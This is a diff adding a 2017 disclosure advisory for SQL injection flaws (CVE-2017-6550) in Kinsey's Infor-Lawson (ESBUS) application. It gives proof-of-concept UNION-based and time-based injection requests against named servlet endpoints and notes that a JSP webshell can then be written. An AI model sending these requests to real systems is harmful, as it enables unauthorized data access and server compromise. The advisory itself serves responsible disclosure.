@@ -1,0 +1,40 @@
+##################################################################
+# Exploit Title: Kinsey Infor / Lawson (ESBUS) - Multiple SQL Injections 
+##################################################################
+# Date: 3/10/2017
+##################################################################
+# Exploit Author: Michael Benich
+##################################################################
+# Vendor homepage: http://www.kinsey.com/infor-lawson.html
+##################################################################
+# Version: ALL
+##################################################################
+# Tested on: Windows Server 2008 R2; MySQL ver 5.5
+##################################################################
+# CVE: CVE-2017-6550
+##################################################################
+
+Kinsey's Infor-Lawson application (formerly ESBUS) is vulnerable to SQL injection in at least two parameters:
+
+1) TABLE parameter, PoC below
+
+GET /esbus/servlet/GetSQLData?SCHEMA=ESBUS_INTERNAL&TABLE=SCHEDULEDTASKS UNION ALL SELECT <<ATTACKER INPUT>>&FIELD=LASTRUN&NOHEADER=1&SELECT=CLASS=com.esbus.appliance.SOD_PolicyCheck_SystemRun_TimerTask&OUT=XML HTTP/1.1
+
+2) Query POST parameter
+
+POST /KK_LS9ReportingPortal/GetData?SERVERID=%27;LSF_PROD& HTTP/1.1
+
+<--snip--http headers-->
+
+QUERY=1 AND SLEEP(5) AND ('foo'='foo')) &OUT=TAB
+
+A JSP webshell can then be written to the /esbus/ directory.
+##################################################################
+Timeline: 
+
+12/1/2016 - Contacted generic security emails
+12/1/2016 - Received response from vendor ("Thanks for the info...")
+2/27/2017 - Followed up with contact and intent to disclose. No reply.
+3/10/2017 - Disclosure
+##################################################################
+ 
